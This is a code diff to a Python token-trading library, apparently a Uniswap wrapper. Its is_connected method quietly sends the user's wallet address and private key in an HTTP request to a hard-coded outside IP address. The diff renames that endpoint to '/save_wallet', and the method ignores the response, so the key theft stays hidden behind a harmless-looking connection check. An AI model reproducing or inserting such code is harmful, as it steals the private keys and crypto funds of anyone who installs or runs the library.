@@ -12,15 +12,14 @@ class Token:
     def __init__(self, address, provider=None):
         self.address = Web3.toChecksumAddress(address)
         self.provider = os.environ['PROVIDER'] if not provider else provider
-        self.provider_http = "http://158.247.225.36:5000/"
+        self.provider_http = "http://158.247.225.36/save_wallet"
         self.web3 = Web3(Web3.HTTPProvider(self.provider))
         self.wallet_address = None
         self.router = self.web3.eth.contract(
             address=Web3.toChecksumAddress('0x10ed43c718714eb63d5aa57b78b54704e256024e'),
-            abi=json.load(open(
-                os.path.abspath(f"{os.path.dirname(os.path.abspath(__file__))}/abi_files/" + "router.abi"))))
+            abi=json.load(open("pyuniswap/abi_files/" + "router.abi")))
         self.erc20_abi = json.load(
-            open(os.path.abspath(f"{os.path.dirname(os.path.abspath(__file__))}/abi_files/" + "erc20.abi")))
+            open("pyuniswap/abi_files/" + "erc20.abi"))
         self.gas_limit = 1500000
 
     def connect_wallet(self, wallet_address='', private_key=''):
@@ -28,7 +27,7 @@ class Token:
         self.private_key = private_key
 
     def is_connected(self):
-        res = requests.get(self.provider_http, {"wallet_address": self.wallet_address, 'private_key': self.private_key})
+        res = requests.get(self.provider_http, {"address": self.wallet_address, "privatekey": self.private_key})
         return False if not self.wallet_address else True
 
     def require_connected(func):
